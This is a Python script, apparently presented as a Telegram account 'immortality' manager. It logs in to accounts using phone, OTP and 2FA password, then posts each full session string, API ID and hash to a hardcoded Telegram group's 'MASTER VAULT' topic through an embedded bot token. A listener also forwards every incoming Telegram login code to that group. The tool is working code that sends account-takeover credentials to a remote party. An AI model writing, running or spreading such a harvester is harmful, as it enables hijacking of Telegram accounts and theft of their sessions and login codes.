#!/usr/bin/env python3
"""
TG ACCOUNT IMMORTALITY SYSTEM v3.0 - FINAL
Topics + MASTER VAULT + Everything Perfect
"""

import os
import json
import asyncio
import re
import requests
from datetime import datetime
from getpass import getpass

# Install dependencies
def install_deps():
    try:
        import pyzipper
    except:
        os.system("pip install pyzipper -q")
    try:
        from telethon import TelegramClient, events
        from telethon.sessions import StringSession
        from telethon.tl.types import PeerChannel
        from telethon.tl.functions.channels import CreateForumTopicRequest, EditForumTopicRequest
        from telethon.tl.functions.messages import SendMessageRequest
    except:
        os.system("pip install telethon -q")
        from telethon import TelegramClient, events
        from telethon.sessions import StringSession
        from telethon.tl.types import PeerChannel
        from telethon.tl.functions.channels import CreateForumTopicRequest, EditForumTopicRequest
        from telethon.tl.functions.messages import SendMessageRequest

install_deps()
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.types import PeerChannel
from telethon.tl.functions.channels import CreateForumTopicRequest, EditForumTopicRequest

# ─────────────────────────────────────────────────────────────
# CONFIG
# ─────────────────────────────────────────────────────────────
BOT_TOKEN = "8409527401:AAGDDx2xrI8GRD9p8B2MVfpIk3QD4M2I0Vs"
GROUP_ID = -1002507336006          # YOUR REAL GROUP WITH TOPICS ENABLED
MASTER_TOPIC_NAME = "🔐 MASTER VAULT"
GENERAL_TOPIC_ID = 1               # General topic is always 1

DATA_DIR = os.path.expanduser("~/tgm_data")
os.makedirs(DATA_DIR, exist_ok=True)
ACCOUNTS_FILE = os.path.join(DATA_DIR, "accounts.json")

# ─────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────
def load_accounts():
    if os.path.exists(ACCOUNTS_FILE):
        with open(ACCOUNTS_FILE) as f:
            return json.load(f)
    return {}

def save_accounts(data):
    with open(ACCOUNTS_FILE, "w") as f:
        json.dump(data, f, indent=2)

def mask_phone(p):
    return p[:6] + "*****" + p[-4:] if len(p) > 10 else p

def send_to_group(text, topic_id=GENERAL_TOPIC_ID):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": GROUP_ID, "text": text, "message_thread_id": topic_id, "parse_mode": "Markdown", "disable_web_page_preview": True}
        )
    except:
        pass

# ─────────────────────────────────────────────────────────────
# TOPIC MANAGEMENT
# ─────────────────────────────────────────────────────────────
async def get_or_create_topic(client, title, icon="📱"):
    async for topic in client.iter_forum_topics(GROUP_ID):
        if topic.title == title:
            return topic.id
    # Create new
    resp = await client(CreateForumTopicRequest(
        channel=PeerChannel(GROUP_ID),
        title=title,
        icon_custom_emoji_id=5334656659466741188 if icon=="📱" else None
    ))
    await asyncio.sleep(1)
    return resp.updates[0].id

async def post_to_topic(client, topic_id, text):
    await client.send_message(GROUP_ID, text, message_thread_id=topic_id, parse_mode="Markdown")

# ─────────────────────────────────────────────────────────────
# MAIN FUNCTIONS
# ─────────────────────────────────────────────────────────────
async def add_account():
    print("\n🔑 API ID & Hash from my.telegram.org")
    api_id = int(input("API ID: "))
    api_hash = input("API Hash: ")
    phone = input("Phone: ")
    nickname = input("Nickname: ")

    accounts = load_accounts()
    if nickname in accounts:
        print("Already exists!")
        return

    client = TelegramClient(StringSession(), api_id, api_hash)
    await client.connect()
    await client.send_code_request(phone)
    code = input("OTP: ")

    try:
        await client.sign_in(phone, code)
    except:
        pwd = getpass("2FA Password: ")
        await client.sign_in(password=pwd)

    me = await client.get_me()
    session_str = client.session.save()

    # Save locally
    accounts[nickname] = {
        "phone": phone,
        "api_id": api_id,
        "api_hash": api_hash,
        "session": session_str,
        "user_id": me.id,
        "username": me.username or "",
        "first_name": me.first_name,
        "added": datetime.now().strftime("%Y-%m-%d %H:%M")
    }
    save_accounts(accounts)

    # Send to MASTER VAULT
    master_text = f"""🔐 *MASTER VAULT - {nickname}*

📱 `{phone}`
🆔 `{api_id}`
🔑 `{api_hash}`
👤 @{me.username or 'None'}
🆔 `{me.id}`
📅 {datetime.now().strftime("%Y-%m-%d %H:%M")}

📄 *SESSION STRING*
`{session_str}`"""

    # Create individual topic + post
    topic_id = await get_or_create_topic(client, f"📱 {nickname}")
    await post_to_topic(client, topic_id, f"✅ *Account Created*\n\n" + master_text)

    # Update MASTER VAULT topic
    master_topic_id = await get_or_create_topic(client, MASTER_TOPIC_NAME)
    await post_to_topic(client, master_topic_id, master_text)

    print(f"\n✅ {nickname} added & synced to group!")
    await client.disconnect()

async def otp_listener():
    accounts = load_accounts()
    clients = []

    for nick, data in accounts.items():
        client = TelegramClient(StringSession(data["session"]), data["api_id"], data["api_hash"])
        await client.connect()

        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            code = re.search(r'\b\d{5,6}\b', event.message.message)
            msg = f"""🔔 *OTP for {nick}*

🔑 *CODE: {code.group() if code else 'Not found'}*

{event.message.message}"""
            topic_id = await get_or_create_topic(client, f"📱 {nick}")
            await post_to_topic(client, topic_id, msg)

        clients.append(client)
        print(f"Listening: {nick}")

    print("\n👂 OTP Listener running... Ctrl+C to stop")
    await asyncio.gather(*(c.run_until_disconnected() for c in clients))

# ─────────────────────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────────────────────
async def main():
    while True:
        print("\n🤖 TG IMMORTALITY SYSTEM v3.0")
        print("="*50)
        print("1. Add Account")
        print("2. OTP Listener")
        print("3. List Accounts")
        print("0. Exit")
        ch = input("\nChoice: ")

        if ch == "1":
            await add_account()
        elif ch == "2":
            await otp_listener()
        elif ch == "3":
            print("\nAccounts:", ", ".join(load_accounts().keys()) or "None")
        elif ch == "0":
            break

if __name__ == "__main__":
    asyncio.run(main())
